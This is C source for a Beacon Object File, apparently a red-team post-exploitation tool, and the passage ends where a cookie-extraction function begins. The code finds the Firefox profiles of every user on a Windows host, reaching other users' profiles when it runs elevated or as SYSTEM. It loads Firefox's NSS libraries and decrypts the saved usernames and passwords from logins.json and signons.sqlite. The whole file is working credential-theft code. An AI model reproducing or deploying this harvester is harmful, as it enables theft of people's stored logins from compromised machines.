/* SPDX-License-Identifier: GPL-3.0-only */
#include "bof_api.h"
#include <shlobj.h>

IMAGE_DOS_HEADER __ImageBase = {.e_magic = IMAGE_DOS_SIGNATURE};

DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE process, DWORD desiredAccess, PHANDLE token);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE token, TOKEN_INFORMATION_CLASS informationClass, LPVOID information, DWORD informationLength, PDWORD returnLength);

typedef struct {
    int type;
    void* data;
    int len;
} TSECItem;

typedef int (*NSS_Init_t)(const char* configdir);
typedef int (*NSS_Shutdown_t)(void);
typedef int (*PK11SDR_Decrypt_t)(TSECItem* data, TSECItem* result, int cx);
typedef void (*SECITEM_FreeItem_t)(TSECItem* item, int freeItem);

static NSS_Init_t p_NSS_Init = NULL;
static NSS_Shutdown_t p_NSS_Shutdown = NULL;
static PK11SDR_Decrypt_t p_PK11SDR_Decrypt = NULL;
static SECITEM_FreeItem_t p_SECITEM_FreeItem = NULL;
static HMODULE hNss3 = NULL;
static HMODULE hNssUtil3 = NULL;
static BOOL nssInitialized = FALSE;
#define NSS_DEPENDENCY_COUNT 7
static HMODULE nssDependencies[NSS_DEPENDENCY_COUNT] = {0};
static int nssDependencyCount = 0;

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
#define SQLITE_OK           0
#define SQLITE_ROW          100
#define SQLITE_DONE         101
#define SQLITE_OPEN_READONLY 0x00000001

typedef int (*sqlite3_open_v2_t)(const char *filename, sqlite3 **ppDb, int flags, const char *zVfs);
typedef int (*sqlite3_prepare_v2_t)(sqlite3 *db, const char *zSql, int nByte, sqlite3_stmt **ppStmt, const char **pzTail);
typedef int (*sqlite3_step_t)(sqlite3_stmt *pStmt);
typedef const unsigned char* (*sqlite3_column_text_t)(sqlite3_stmt *pStmt, int iCol);
typedef int (*sqlite3_finalize_t)(sqlite3_stmt *pStmt);
typedef int (*sqlite3_close_t)(sqlite3 *db);

static sqlite3_open_v2_t p_sqlite3_open_v2 = NULL;
static sqlite3_prepare_v2_t p_sqlite3_prepare_v2 = NULL;
static sqlite3_step_t p_sqlite3_step = NULL;
static sqlite3_column_text_t p_sqlite3_column_text = NULL;
static sqlite3_finalize_t p_sqlite3_finalize = NULL;
static sqlite3_close_t p_sqlite3_close = NULL;
static HMODULE hSqlite3 = NULL;

#ifndef CSIDL_APPDATA
#define CSIDL_APPDATA 0x001A
#endif
#ifndef SHGFP_TYPE_CURRENT
#define SHGFP_TYPE_CURRENT 0
#endif

#define MAX_ENTRIES_PER_TYPE        50
#define MAX_PATH_LEN                260
#define FIREFOX_BASE_PATH           "Mozilla\\Firefox\\Profiles"
#define MAX_PROFILES                10
#define MAX_LOGINS_JSON_BYTES       (32U * 1024U * 1024U)

static char profilePaths[MAX_PROFILES][MAX_PATH_LEN];
static int profileCount = 0;

#ifndef CRYPT_STRING_BASE64
#define CRYPT_STRING_BASE64 0x00000001
#endif

#define PROFILE_KEY_NONE    0
#define PROFILE_KEY3_DB     1
#define PROFILE_KEY4_DB     2

static BYTE* Base64Decode(const char* input, DWORD inputLen, DWORD* outputLen);
static BOOL DecryptWithNSS(const char* base64Encrypted, DWORD encryptedLen, char** decrypted);

static BOOL BuildPath(char* destination, size_t capacity, const char* base, const char* component) {
    size_t baseLength;
    size_t componentLength;
    BOOL needsSeparator;

    if (!destination || capacity == 0 || !base || !component) {
        return FALSE;
    }

    baseLength = MSVCRT$strlen(base);
    componentLength = MSVCRT$strlen(component);
    needsSeparator = (baseLength > 0 && base[baseLength - 1] != '\\' && base[baseLength - 1] != '/');
    if (baseLength + (needsSeparator ? 1 : 0) + componentLength + 1 > capacity) {
        destination[0] = '\0';
        return FALSE;
    }

    MSVCRT$memcpy(destination, base, baseLength);
    if (needsSeparator) {
        destination[baseLength++] = '\\';
    }
    MSVCRT$memcpy(destination + baseLength, component, componentLength);
    destination[baseLength + componentLength] = '\0';
    return TRUE;
}

static BOOL ProfileHasFile(const char* profilePath, const char* fileName) {
    char path[MAX_PATH] = {0};
    return BuildPath(path, sizeof(path), profilePath, fileName) &&
           KERNEL32$GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static BOOL IsProcessElevated(void) {
    HANDLE token = NULL;
    TOKEN_ELEVATION elevation = {0};
    DWORD returned = 0;
    BOOL elevated = FALSE;

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (ADVAPI32$GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &returned)) {
            elevated = elevation.TokenIsElevated != 0;
        }
        KERNEL32$CloseHandle(token);
    }
    return elevated;
}

static int DetectKeyDatabase(const char* profilePath) {
    char pathBuf[MAX_PATH] = {0};

    if (BuildPath(pathBuf, sizeof(pathBuf), profilePath, "key4.db") &&
        KERNEL32$GetFileAttributesA(pathBuf) != INVALID_FILE_ATTRIBUTES) {
        return PROFILE_KEY4_DB;
    }

    if (BuildPath(pathBuf, sizeof(pathBuf), profilePath, "key3.db") &&
        KERNEL32$GetFileAttributesA(pathBuf) != INVALID_FILE_ATTRIBUTES) {
        return PROFILE_KEY3_DB;
    }

    return PROFILE_KEY_NONE;
}

static BOOL HasLoginsJson(const char* profilePath) {
    return ProfileHasFile(profilePath, "logins.json");
}

static BOOL HasSignonsSqlite(const char* profilePath) {
    return ProfileHasFile(profilePath, "signons.sqlite");
}

static void UnloadSQLiteFunctions(void) {
    if (hSqlite3) {
        KERNEL32$FreeLibrary(hSqlite3);
        hSqlite3 = NULL;
    }
    p_sqlite3_open_v2 = NULL;
    p_sqlite3_prepare_v2 = NULL;
    p_sqlite3_step = NULL;
    p_sqlite3_column_text = NULL;
    p_sqlite3_finalize = NULL;
    p_sqlite3_close = NULL;
}

static BOOL LoadSQLiteFunctions(void) {
    if (hSqlite3) {
        return TRUE;
    }

    hSqlite3 = KERNEL32$LoadLibraryA("winsqlite3.dll");
    if (!hSqlite3) {
        return FALSE;
    }

    p_sqlite3_open_v2 = (sqlite3_open_v2_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_open_v2");
    p_sqlite3_prepare_v2 = (sqlite3_prepare_v2_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_prepare_v2");
    p_sqlite3_step = (sqlite3_step_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_step");
    p_sqlite3_column_text = (sqlite3_column_text_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_column_text");
    p_sqlite3_finalize = (sqlite3_finalize_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_finalize");
    p_sqlite3_close = (sqlite3_close_t)KERNEL32$GetProcAddress(hSqlite3, "sqlite3_close");

    if (!p_sqlite3_open_v2 || !p_sqlite3_prepare_v2 || !p_sqlite3_step ||
        !p_sqlite3_column_text || !p_sqlite3_finalize || !p_sqlite3_close) {
        UnloadSQLiteFunctions();
        return FALSE;
    }

    return TRUE;
}

static char* FindFirefoxInstallation(void) {
    char nss3Path[MAX_PATH] = {0};
    const char* possiblePaths[] = {
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        "C:\\Program Files\\Firefox",
        "C:\\Program Files (x86)\\Firefox",
        "C:\\Program Files\\Mozilla Firefox ESR",
        "C:\\Program Files (x86)\\Mozilla Firefox ESR"
    };
    int pathCount = (int)(sizeof(possiblePaths) / sizeof(possiblePaths[0]));
    int i = 0;

    for (i = 0; i < pathCount; i++) {
        if (BuildPath(nss3Path, sizeof(nss3Path), possiblePaths[i], "nss3.dll") &&
            KERNEL32$GetFileAttributesA(nss3Path) != INVALID_FILE_ATTRIBUTES) {
            size_t pathLength = MSVCRT$strlen(possiblePaths[i]);
            char* firefoxPath = (char*)intAlloc(pathLength + 1);
            if (firefoxPath) {
                MSVCRT$memcpy(firefoxPath, possiblePaths[i], pathLength + 1);
            }
            return firefoxPath;
        }
    }

    return NULL;
}

static void UnloadNSSLibraries(void) {
    int i;

    if (nssInitialized) {
        return;
    }

    if (hNss3) {
        KERNEL32$FreeLibrary(hNss3);
        hNss3 = NULL;
    }
    for (i = nssDependencyCount - 1; i >= 0; i--) {
        if (nssDependencies[i]) {
            KERNEL32$FreeLibrary(nssDependencies[i]);
            nssDependencies[i] = NULL;
        }
    }
    nssDependencyCount = 0;
    hNssUtil3 = NULL;
    p_NSS_Init = NULL;
    p_NSS_Shutdown = NULL;
    p_PK11SDR_Decrypt = NULL;
    p_SECITEM_FreeItem = NULL;
}

static BOOL LoadNSSLibraries(const char* firefoxPath) {
    char dllPath[MAX_PATH] = {0};
    int i = 0;

    if (!firefoxPath) {
        return FALSE;
    }

    const char* dependencies[] = {
        "mozglue.dll",
        "nssutil3.dll",
        "nspr4.dll",
        "plc4.dll",
        "plds4.dll",
        "softokn3.dll",
        "freebl3.dll"
    };

    for (i = 0; i < (int)(sizeof(dependencies) / sizeof(dependencies[0])); i++) {
        HMODULE loaded;

        if (!BuildPath(dllPath, sizeof(dllPath), firefoxPath, dependencies[i])) {
            UnloadNSSLibraries();
            return FALSE;
        }
        loaded = KERNEL32$LoadLibraryA(dllPath);
        if (loaded) {
            nssDependencies[nssDependencyCount] = loaded;
            nssDependencyCount++;
            if (i == 1) {
                hNssUtil3 = loaded;
            }
        }
    }

    if (!BuildPath(dllPath, sizeof(dllPath), firefoxPath, "nss3.dll")) {
        UnloadNSSLibraries();
        return FALSE;
    }
    hNss3 = KERNEL32$LoadLibraryA(dllPath);
    if (!hNss3) {
        UnloadNSSLibraries();
        return FALSE;
    }
    if (!hNssUtil3) {
        hNssUtil3 = KERNEL32$GetModuleHandleA("nssutil3.dll");
    }

    p_NSS_Init = (NSS_Init_t)KERNEL32$GetProcAddress(hNss3, "NSS_Init");
    p_NSS_Shutdown = (NSS_Shutdown_t)KERNEL32$GetProcAddress(hNss3, "NSS_Shutdown");
    p_PK11SDR_Decrypt = (PK11SDR_Decrypt_t)KERNEL32$GetProcAddress(hNss3, "PK11SDR_Decrypt");
    p_SECITEM_FreeItem = (SECITEM_FreeItem_t)KERNEL32$GetProcAddress(hNss3, "SECITEM_ZfreeItem");
    if (!p_SECITEM_FreeItem && hNssUtil3) {
        p_SECITEM_FreeItem = (SECITEM_FreeItem_t)KERNEL32$GetProcAddress(hNssUtil3, "SECITEM_ZfreeItem");
    }
    if (!p_SECITEM_FreeItem) {
        p_SECITEM_FreeItem = (SECITEM_FreeItem_t)KERNEL32$GetProcAddress(hNss3, "SECITEM_FreeItem");
    }
    if (!p_SECITEM_FreeItem && hNssUtil3) {
        p_SECITEM_FreeItem = (SECITEM_FreeItem_t)KERNEL32$GetProcAddress(hNssUtil3, "SECITEM_FreeItem");
    }

    if (!p_NSS_Init || !p_NSS_Shutdown || !p_PK11SDR_Decrypt || !p_SECITEM_FreeItem) {
        UnloadNSSLibraries();
        return FALSE;
    }

    return TRUE;
}

static BOOL ShutdownNSS(void) {
    if (!nssInitialized) {
        return TRUE;
    }
    if (!p_NSS_Shutdown || p_NSS_Shutdown() != 0) {
        return FALSE;
    }
    nssInitialized = FALSE;
    return TRUE;
}

static BOOL InitializeNSS(const char* profilePath, int keyType) {
    char* firefoxPath = NULL;
    char configPath[MAX_PATH + 5] = {0};
    const char* prefix = keyType == PROFILE_KEY4_DB ? "sql:" : "dbm:";
    size_t prefixLength = MSVCRT$strlen(prefix);
    size_t profileLength = MSVCRT$strlen(profilePath);
    int result = 0;

    if (keyType != PROFILE_KEY3_DB && keyType != PROFILE_KEY4_DB) {
        return FALSE;
    }
    if (nssInitialized && !ShutdownNSS()) {
        return FALSE;
    }
    if (prefixLength + profileLength + 1 > sizeof(configPath)) {
        return FALSE;
    }

    if (!hNss3 || !p_NSS_Init || !p_PK11SDR_Decrypt || !p_SECITEM_FreeItem) {
        firefoxPath = FindFirefoxInstallation();
        if (!firefoxPath) {
            return FALSE;
        }

        if (!LoadNSSLibraries(firefoxPath)) {
            if (firefoxPath) intFree(firefoxPath);
            return FALSE;
        }

        if (firefoxPath) intFree(firefoxPath);
    }

    MSVCRT$memcpy(configPath, prefix, prefixLength);
    MSVCRT$memcpy(configPath + prefixLength, profilePath, profileLength + 1);
    result = p_NSS_Init(configPath);
    nssInitialized = (result == 0);

    return nssInitialized;
}

static BOOL DecryptWithNSS(const char* base64Encrypted, DWORD encryptedLen, char** decrypted) {
    BYTE* pbEncrypted = NULL;
    DWORD dwEncrypted = 0;
    TSECItem data = {0};
    TSECItem result = {0};
    char* pszResult = NULL;
    BOOL bResult = FALSE;

    if (!base64Encrypted || encryptedLen == 0 || !decrypted ||
        !nssInitialized || !p_PK11SDR_Decrypt || !p_SECITEM_FreeItem) {
        return FALSE;
    }
    *decrypted = NULL;

    pbEncrypted = Base64Decode(base64Encrypted, encryptedLen, &dwEncrypted);
    if (!pbEncrypted || dwEncrypted == 0) {
        return FALSE;
    }

    data.type = 0;
    data.data = pbEncrypted;
    data.len = (int)dwEncrypted;

    result.type = 0;
    result.data = NULL;
    result.len = 0;

    if (p_PK11SDR_Decrypt(&data, &result, 0) == 0 && result.len > 0) {
        pszResult = (char*)intAlloc(result.len + 1);
        if (pszResult) {
            MSVCRT$memcpy(pszResult, result.data, result.len);
            pszResult[result.len] = '\0';
            *decrypted = pszResult;
            bResult = TRUE;
        }
    }

    if (result.data) {
        if (result.len > 0) {
            MSVCRT$memset(result.data, 0, result.len);
        }
        p_SECITEM_FreeItem(&result, FALSE);
    }
    intFree(pbEncrypted);
    return bResult;
}

static BOOL ReadFileFromDisk(const char* filePath, BYTE** buffer, DWORD* size) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD bytesRead = 0;

    *buffer = NULL;
    *size = 0;

    hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    *size = KERNEL32$GetFileSize(hFile, NULL);
    if (*size == INVALID_FILE_SIZE || *size == 0 || *size > MAX_LOGINS_JSON_BYTES) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    *buffer = (BYTE*)intAlloc((SIZE_T)*size + 1);
    if (!*buffer) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    if (!KERNEL32$ReadFile(hFile, *buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
        intFree(*buffer);
        *buffer = NULL;
        *size = 0;
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    (*buffer)[*size] = '\0';
    KERNEL32$CloseHandle(hFile);
    return TRUE;
}

static BOOL FindFirefoxProfilesForUser(const char* userAppDataPath) {
    char profilesPath[MAX_PATH] = {0};
    char searchPath[MAX_PATH] = {0};
    WIN32_FIND_DATAA findData = {0};
    HANDLE hFind = INVALID_HANDLE_VALUE;
    BOOL found = FALSE;

    if (!BuildPath(profilesPath, sizeof(profilesPath), userAppDataPath, FIREFOX_BASE_PATH) ||
        !BuildPath(searchPath, sizeof(searchPath), profilesPath, "*")) {
        return FALSE;
    }

    hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (MSVCRT$strcmp(findData.cFileName, ".") != 0 && MSVCRT$strcmp(findData.cFileName, "..") != 0) {
                if (profileCount < MAX_PROFILES) {
                    if (BuildPath(profilePaths[profileCount], sizeof(profilePaths[profileCount]),
                                  profilesPath, findData.cFileName)) {
                        profileCount++;
                        found = TRUE;
                    }
                }
            }
        }
    } while (KERNEL32$FindNextFileA(hFind, &findData) && profileCount < MAX_PROFILES);

    KERNEL32$FindClose(hFind);
    return found;
}

static BOOL FindAllFirefoxProfiles(void) {
    char appDataPath[MAX_PATH] = {0};
    char usersPath[MAX_PATH] = "C:\\Users";
    char userPath[MAX_PATH] = {0};
    char userAppDataPath[MAX_PATH] = {0};
    WIN32_FIND_DATAA findData = {0};
    HANDLE hFind = INVALID_HANDLE_VALUE;
    BOOL found = FALSE;
    BOOL isSystem = FALSE;
    BOOL isAdmin = FALSE;

    profileCount = 0;

    isAdmin = IsProcessElevated();

    typedef DWORD (WINAPI *GetEnvironmentVariableA_t)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
    HMODULE hKernel32 = (HMODULE)KERNEL32$GetModuleHandleA("kernel32.dll");
    GetEnvironmentVariableA_t pGetEnvironmentVariableA = NULL;
    if (hKernel32) {
        pGetEnvironmentVariableA = (GetEnvironmentVariableA_t)KERNEL32$GetProcAddress(hKernel32, "GetEnvironmentVariableA");
    }

    if (pGetEnvironmentVariableA) {
        char username[64] = {0};
        DWORD usernameLength = pGetEnvironmentVariableA("USERNAME", username, sizeof(username));
        if (usernameLength > 0 && usernameLength < sizeof(username)) {
            if (MSVCRT$_stricmp(username, "SYSTEM") == 0) {
                isSystem = TRUE;
            }
        }
    }

    if (isSystem || isAdmin) {
        char searchPath[MAX_PATH] = {0};
        if (!BuildPath(searchPath, sizeof(searchPath), usersPath, "*")) {
            return FALSE;
        }

        hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
        if (hFind == INVALID_HANDLE_VALUE) {
            if (SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath) == S_OK) {
                return FindFirefoxProfilesForUser(appDataPath);
            }
            return FALSE;
        }

        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (MSVCRT$strcmp(findData.cFileName, ".") == 0 || MSVCRT$strcmp(findData.cFileName, "..") == 0) {
                    continue;
                }

                if (MSVCRT$_stricmp(findData.cFileName, "Public") == 0 ||
                    MSVCRT$_stricmp(findData.cFileName, "Default") == 0 ||
                    MSVCRT$_stricmp(findData.cFileName, "Default User") == 0) {
                    continue;
                }

                if (!BuildPath(userPath, sizeof(userPath), usersPath, findData.cFileName) ||
                    !BuildPath(userAppDataPath, sizeof(userAppDataPath), userPath, "AppData\\Roaming")) {
                    continue;
                }

                if (KERNEL32$GetFileAttributesA(userAppDataPath) != INVALID_FILE_ATTRIBUTES) {
                    if (FindFirefoxProfilesForUser(userAppDataPath)) {
                        found = TRUE;
                    }
                }
            }
        } while (KERNEL32$FindNextFileA(hFind, &findData) && profileCount < MAX_PROFILES);

        KERNEL32$FindClose(hFind);
    } else {
        if (SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath) == S_OK) {
            found = FindFirefoxProfilesForUser(appDataPath);
        }
    }

    return found;
}

static BYTE* Base64Decode(const char* input, DWORD inputLen, DWORD* outputLen) {
    DWORD dwOutput = 0;
    BYTE* pbOutput = NULL;

    if (!input || inputLen == 0 || !outputLen) {
        return NULL;
    }

    *outputLen = 0;

    if (!CRYPT32$CryptStringToBinaryA(input, inputLen, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL)) {
        return NULL;
    }

    pbOutput = (BYTE*)intAlloc(dwOutput);
    if (!pbOutput) {
        return NULL;
    }

    if (!CRYPT32$CryptStringToBinaryA(input, inputLen, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL)) {
        intFree(pbOutput);
        return NULL;
    }

    *outputLen = dwOutput;
    return pbOutput;
}

static BOOL DecryptFirefoxSecret(const char* pszBase64Encrypted, DWORD encryptedLen, char** ppszDecrypted) {
    char* pszResult = NULL;

    if (!pszBase64Encrypted || !ppszDecrypted) {
        return FALSE;
    }

    *ppszDecrypted = NULL;

    if (nssInitialized && p_PK11SDR_Decrypt) {
        if (DecryptWithNSS(pszBase64Encrypted, encryptedLen, &pszResult)) {
            *ppszDecrypted = pszResult;
            return TRUE;
        }
    }

    return FALSE;
}

static const char* FindJsonPropertyValue(const char* json, DWORD jsonLen, const char* key) {
    size_t index = 0;
    size_t keyLen;
    int objectDepth = 0;

    if (!json || !key) {
        return NULL;
    }

    keyLen = MSVCRT$strlen(key);
    if (keyLen == 0 || keyLen > jsonLen) {
        return NULL;
    }

    while (index < jsonLen) {
        size_t tokenStart;
        size_t tokenLen;
        size_t separator;
        BOOL escaped = FALSE;

        if (json[index] == '{') {
            objectDepth++;
            index++;
            continue;
        }
        if (json[index] == '}') {
            if (objectDepth > 0) {
                objectDepth--;
            }
            index++;
            continue;
        }
        if (json[index] != '"') {
            index++;
            continue;
        }

        tokenStart = ++index;
        while (index < jsonLen) {
            if (json[index] == '"' && !escaped) {
                break;
            }
            if (json[index] == '\\' && !escaped) {
                escaped = TRUE;
            } else {
                escaped = FALSE;
            }
            index++;
        }
        if (index >= jsonLen) {
            return NULL;
        }

        tokenLen = index - tokenStart;
        separator = ++index;
        while (separator < jsonLen &&
               (json[separator] == ' ' || json[separator] == '\t' ||
                json[separator] == '\n' || json[separator] == '\r')) {
            separator++;
        }
        if (objectDepth == 1 && tokenLen == keyLen &&
            MSVCRT$memcmp(json + tokenStart, key, keyLen) == 0 &&
            separator < jsonLen && json[separator] == ':') {
            separator++;
            while (separator < jsonLen &&
                   (json[separator] == ' ' || json[separator] == '\t' ||
                    json[separator] == '\n' || json[separator] == '\r')) {
                separator++;
            }
            if (separator < jsonLen) {
                return json + separator;
            }
            return NULL;
        }
    }

    return NULL;
}

static char* FindJsonStringValue(const char* json, DWORD jsonLen, const char* key, DWORD* valueLen) {
    const char* jsonEnd = NULL;
    const char* valueStart = NULL;
    const char* valueEnd = NULL;
    BOOL escaped = FALSE;

    if (!json || !key || !valueLen) {
        return NULL;
    }

    *valueLen = 0;
    jsonEnd = json + jsonLen;
    valueStart = FindJsonPropertyValue(json, jsonLen, key);
    if (!valueStart || valueStart >= jsonEnd || *valueStart != '"') {
        return NULL;
    }

    valueStart++;
    for (valueEnd = valueStart; valueEnd < jsonEnd; valueEnd++) {
        if (*valueEnd == '"' && !escaped) {
            break;
        }
        if (*valueEnd == '\\' && !escaped) {
            escaped = TRUE;
        } else {
            escaped = FALSE;
        }
    }
    if (valueEnd >= jsonEnd) {
        return NULL;
    }

    *valueLen = (DWORD)(valueEnd - valueStart);
    return (char*)valueStart;
}

static char* FindJsonArrayValue(const char* json, DWORD jsonLen, const char* key, DWORD* arrayLen) {
    const char* jsonEnd = NULL;
    const char* arrayStart = NULL;
    const char* arrayEnd = NULL;
    int bracketCount = 0;
    BOOL inString = FALSE;
    BOOL escaped = FALSE;

    if (!json || !key || !arrayLen) {
        return NULL;
    }

    *arrayLen = 0;
    jsonEnd = json + jsonLen;
    arrayStart = FindJsonPropertyValue(json, jsonLen, key);
    if (!arrayStart || arrayStart >= jsonEnd || *arrayStart != '[') {
        return NULL;
    }

    arrayStart++;
    arrayEnd = arrayStart;
    bracketCount = 1;

    while (arrayEnd < jsonEnd && bracketCount > 0) {
        if (inString) {
            if (*arrayEnd == '"' && !escaped) {
                inString = FALSE;
            }
            if (*arrayEnd == '\\' && !escaped) {
                escaped = TRUE;
            } else {
                escaped = FALSE;
            }
        } else if (*arrayEnd == '"') {
            inString = TRUE;
        } else if (*arrayEnd == '[') {
            bracketCount++;
        } else if (*arrayEnd == ']') {
            bracketCount--;
        }
        arrayEnd++;
    }

    if (bracketCount != 0) {
        return NULL;
    }

    arrayEnd--;

    *arrayLen = (DWORD)(arrayEnd - arrayStart);
    return (char*)arrayStart;
}

static BOOL FindNextJsonObject(
    const char* json,
    DWORD jsonLen,
    const char** objectStart,
    DWORD* objectLen
) {
    const char* cursor;
    const char* jsonEnd;
    const char* start = NULL;
    int braceCount = 0;
    BOOL inString = FALSE;
    BOOL escaped = FALSE;

    if (!json || !objectStart || !objectLen) {
        return FALSE;
    }

    *objectStart = NULL;
    *objectLen = 0;
    jsonEnd = json + jsonLen;

    for (cursor = json; cursor < jsonEnd; cursor++) {
        if (inString) {
            if (*cursor == '"' && !escaped) {
                inString = FALSE;
            }
            if (*cursor == '\\' && !escaped) {
                escaped = TRUE;
            } else {
                escaped = FALSE;
            }
            continue;
        }

        if (*cursor == '"') {
            inString = TRUE;
        } else if (*cursor == '{') {
            if (braceCount == 0) {
                start = cursor;
            }
            braceCount++;
        } else if (*cursor == '}' && braceCount > 0) {
            braceCount--;
            if (braceCount == 0) {
                *objectStart = start;
                *objectLen = (DWORD)(cursor - start + 1);
                return TRUE;
            }
        }
    }

    return FALSE;
}

static void DecryptAndPrint(const char* label, const char* encrypted, DWORD encLen, BOOL nssReady) {
    char* decrypted = NULL;

    if (nssReady && DecryptFirefoxSecret(encrypted, encLen, &decrypted)) {
        SafeAppend(" | %s: %s", label, decrypted);
        if (decrypted) {
            MSVCRT$memset(decrypted, 0, MSVCRT$strlen(decrypted));
            intFree(decrypted);
        }
    } else {
        char tmp[256] = {0};
        int copyLen = encLen < 255 ? encLen : 255;
        MSVCRT$memcpy(tmp, encrypted, copyLen);
        tmp[copyLen] = '\0';
        SafeAppend(" | %s (encrypted): %s", label, tmp);
    }
}

static BOOL ExtractPasswordsFromLoginsJson(const char* loginsJsonPath, BOOL nssReady) {
    BYTE* fileContent = NULL;
    DWORD fileSize = 0;
    int count = 0;
    const char* loginsArray = NULL;
    DWORD loginsArrayLen = 0;
    const char* cursor = NULL;

    if (!ReadFileFromDisk(loginsJsonPath, &fileContent, &fileSize)) {
        SafeAppend("[!] Failed to read logins.json\n");
        return FALSE;
    }

    SafeAppend("\n[+] Saved Passwords (logins.json):\n");
    SafeAppend("================================\n");

    loginsArray = FindJsonArrayValue((char*)fileContent, fileSize, "logins", &loginsArrayLen);
    if (!loginsArray || loginsArrayLen == 0) {
        SafeAppend("[!] No logins array found or array is empty\n");
        intFree(fileContent);
        return FALSE;
    }

    cursor = loginsArray;
    while (count < MAX_ENTRIES_PER_TYPE && cursor < loginsArray + loginsArrayLen) {
        DWORD cursorRemaining = (DWORD)(loginsArrayLen - (cursor - loginsArray));
        const char* objectStart = NULL;
        DWORD objectLen = 0;
        DWORD hostnameLen = 0;
        DWORD usernameLen = 0;
        DWORD passwordLen = 0;
        char* hostname;
        char* username;
        char* password;

        if (!FindNextJsonObject(cursor, cursorRemaining, &objectStart, &objectLen)) {
            break;
        }
        cursor = objectStart + objectLen;

        hostname = FindJsonStringValue(objectStart, objectLen, "hostname", &hostnameLen);
        if (!hostname || hostnameLen == 0) {
            continue;
        }

        username = FindJsonStringValue(objectStart, objectLen, "encryptedUsername", &usernameLen);
        password = FindJsonStringValue(objectStart, objectLen, "encryptedPassword", &passwordLen);

        if (!username || usernameLen == 0) {
            continue;
        }

        if (!password || passwordLen == 0) {
            continue;
        }

        char hostnameStr[512] = {0};
        DWORD copyLen = hostnameLen < 511 ? hostnameLen : 511;
        MSVCRT$memcpy(hostnameStr, hostname, copyLen);
        hostnameStr[copyLen] = '\0';

        SafeAppend("URL: %s", hostnameStr);
        DecryptAndPrint("Username", username, usernameLen, nssReady);
        DecryptAndPrint("Password", password, passwordLen, nssReady);
        SafeAppend("\n");

        count++;
    }

    if (count == 0) {
        SafeAppend("[!] No password entries found in logins.json\n");
    } else {
        SafeAppend("\n[+] Found %d password entries\n", count);
    }

    intFree(fileContent);
    return (count > 0);
}

static BOOL ExtractPasswordsFromSignonsSqlite(const char* profilePath, BOOL nssReady) {
    char dbPath[MAX_PATH] = {0};
    sqlite3* db = NULL;
    sqlite3_stmt* stmt = NULL;
    int result = 0;
    int count = 0;

    if (!p_sqlite3_open_v2) {
        SafeAppend("[!] SQLite not available - cannot read signons.sqlite\n");
        return FALSE;
    }

    if (!BuildPath(dbPath, sizeof(dbPath), profilePath, "signons.sqlite")) {
        SafeAppend("[!] Profile path is too long for signons.sqlite\n");
        return FALSE;
    }

    result = p_sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READONLY, NULL);
    if (result != SQLITE_OK) {
        SafeAppend("[!] Failed to open signons.sqlite\n");
        if (db) p_sqlite3_close(db);
        return FALSE;
    }

    result = p_sqlite3_prepare_v2(db, "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins", -1, &stmt, NULL);
    if (result != SQLITE_OK) {
        p_sqlite3_close(db);
        return FALSE;
    }

    SafeAppend("\n[+] Saved Passwords (signons.sqlite - legacy):\n");
    SafeAppend("================================\n");

    while ((result = p_sqlite3_step(stmt)) == SQLITE_ROW && count < MAX_ENTRIES_PER_TYPE) {
        const char* hostname = (const char*)p_sqlite3_column_text(stmt, 0);
        const char* username = (const char*)p_sqlite3_column_text(stmt, 1);
        const char* password = (const char*)p_sqlite3_column_text(stmt, 2);

        SafeAppend("URL: %s", hostname ? hostname : "");
        if (username && MSVCRT$strlen(username) > 0) {
            DecryptAndPrint("Username", username, (DWORD)MSVCRT$strlen(username), nssReady);
        }
        if (password && MSVCRT$strlen(password) > 0) {
            DecryptAndPrint("Password", password, (DWORD)MSVCRT$strlen(password), nssReady);
        }
        SafeAppend("\n");
        count++;
    }

    if (count == 0) {
        SafeAppend("[!] No password entries found in signons.sqlite\n");
    } else {
        SafeAppend("\n[+] Found %d password entries\n", count);
    }

    if (stmt) p_sqlite3_finalize(stmt);
    if (db) p_sqlite3_close(db);
    return (count > 0);
}

static BOOL ExtractCookies(const char* cookiesDbPath) {
    sqlite3* db = NULL;
